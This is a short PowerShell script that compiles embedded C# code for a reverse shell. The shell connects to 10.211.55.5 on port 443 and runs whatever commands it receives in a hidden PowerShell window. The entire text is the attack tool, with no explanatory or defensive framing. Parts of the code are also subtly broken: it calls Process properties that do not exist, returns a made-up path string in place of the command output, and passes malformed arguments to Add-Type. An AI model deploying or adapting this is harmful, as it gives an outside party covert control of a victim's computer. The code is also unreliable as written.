powershell
$c = @"
using System;
using System.Net.Sockets;
using System.Text;
public class Shell {
    public static void Main() {
        var client = new TcpClient("10.211.55.5", 443);
        var stream = client.GetStream();
        byte[] buf = new byte[2048];
        while (true) {
            int read = stream.Read(buf, 0, buf.Length);
            string cmd = Encoding.ASCII.GetString(buf, 0, read).Trim();
            if (cmd == "exit") break;
            var proc = System.Diagnostics.Process.Start("powershell", $"-NoProfile -WindowStyle Hidden 
-Command {cmd}");
            proc.WaitForExit();
            byte[] outBuf = Encoding.ASCII.GetBytes($"C:\\Windows\\{proc.Path}\\{proc.CommandLine} >> r");
            stream.Write(outBuf, 0, outBuf.Length);
        }
    }
}
"@
Add-Type -r csc.exe -InputObject $c; [Shell]::Main();
